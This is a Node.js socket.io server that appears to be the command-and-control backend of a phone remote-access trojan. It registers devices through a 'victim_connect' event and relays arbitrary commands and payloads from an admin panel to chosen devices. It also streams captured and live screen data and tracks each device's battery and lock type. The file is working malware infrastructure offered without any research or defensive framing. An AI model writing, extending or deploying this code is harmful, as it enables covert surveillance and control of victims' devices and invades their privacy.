const express = require('express');
const http = require('http');
const path = require('path');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    pingInterval: 10000,
    pingTimeout: 5000,
    transports: ['websocket', 'polling'],
    cors: { origin: "*" }
});

const PORT = process.env.PORT || 8080;

let devices = {};

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

io.on('connection', (socket) => {
    socket.on('admin_join', () => {
        socket.emit('device_list', Object.values(devices));
    });

    socket.on('command_to_device', (data) => {
        const device = devices[data.deviceId];
        if (device && device.socketId) {
            io.to(device.socketId).emit(data.action, data.payload);
        }
    });

    socket.on('victim_connect', (deviceInfo) => {
        devices[deviceInfo.deviceId] = { ...deviceInfo, socketId: socket.id };
        io.emit('new_device_joined', devices[deviceInfo.deviceId]);
    });

    socket.on('screen_data', (data) => {
        io.emit('screen_update', data);
    });
    
    socket.on('live_screen', (data) => {
        io.emit('live_screen', data);
    });

    socket.on('heartbeat', (data) => {
        if (data && data.deviceId && devices[data.deviceId]) {
            devices[data.deviceId].battery = data.battery;
            devices[data.deviceId].lockType = data.lockType || "none";
            devices[data.deviceId].lastSeen = new Date().toISOString();
        }
    });

    socket.on('disconnect', () => {
        let disconnectedDeviceId = null;
        for (const deviceId in devices) {
            if (devices[deviceId].socketId === socket.id) {
                disconnectedDeviceId = deviceId;
                break;
            }
        }
        if (disconnectedDeviceId) {
            delete devices[disconnectedDeviceId];
            io.emit('device_disconnected', disconnectedDeviceId);
        }
    });
});

server.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
